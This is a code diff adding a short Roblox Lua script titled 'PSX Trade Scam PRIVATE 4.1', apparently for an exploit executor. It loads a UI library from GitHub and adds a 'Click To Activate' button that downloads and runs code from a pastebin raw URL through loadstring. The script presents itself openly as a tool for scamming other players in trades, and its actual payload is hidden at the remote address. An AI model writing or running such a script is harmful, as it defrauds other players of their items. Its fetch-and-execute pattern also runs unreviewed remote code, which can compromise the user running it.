@@ -1,0 +1,14 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("PSX Trade Scam PRIVATE 4.1", "Midnight")
+    -- MAIN
+    local Main = Window:NewTab("Credits")
+    local MainSection = Main:NewSection("Script Made By Sadmc")
+    local Main = Window:NewTab("Trade Scam")
+    local MainSection = Main:NewSection("Trade Scam")
+
+
+    MainSection:NewButton("Click To Activate", "Made by Sadmc", function()
+   
+  loadstring(game:HttpGet('https://pastebin.com/raw/JpKxp0aD'))()
+      end)
+
